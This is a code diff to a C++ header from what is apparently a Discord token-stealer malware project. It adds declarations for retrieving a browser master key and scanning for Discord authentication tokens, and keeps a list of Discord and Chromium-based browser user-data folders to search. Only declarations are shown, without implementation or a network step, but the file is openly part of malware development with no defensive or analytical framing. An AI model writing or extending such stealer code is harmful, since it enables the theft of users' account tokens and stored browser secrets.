@@ -5,14 +5,24 @@
 #ifndef STEALER_DISCORD_H
 #define STEALER_DISCORD_H
 
+#include <fstream>
+#include <sstream>
+#include <regex>
+#include "json.hpp"
 
 #include "../../../StealerImpl.h"
+
+using json = nlohmann::json;
 
 class Discord : public StealerImpl {
 public:
     void execute(fs::path &root) override;
 private:
+    static std::string getMaterKey(fs::path &root);
+
     std::vector<std::string> getTokens();
+    std::vector<std::string> getToken(fs::path &root);
+    std::vector<std::string> scanToken(fs::path &root, std::string master_key);
 
     std::vector<fs::path> discord_paths = {
         Utils::getRoamingPath() / "discord",
@@ -35,7 +45,7 @@ private:
         Utils::getLocalPath() / "uCozMedia" / "Uran" / "User Data" / "Default",
         Utils::getLocalPath() / "Yandex" / "YandexBrowser" / "User Data" / "Default",
         Utils::getLocalPath() / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
-        Utils::getLocalPath() / "Iridium" / "User Data" / "Default",
+        Utils::getLocalPath() / "Iridium" / "User Data" / "Default"
     };
 };
 
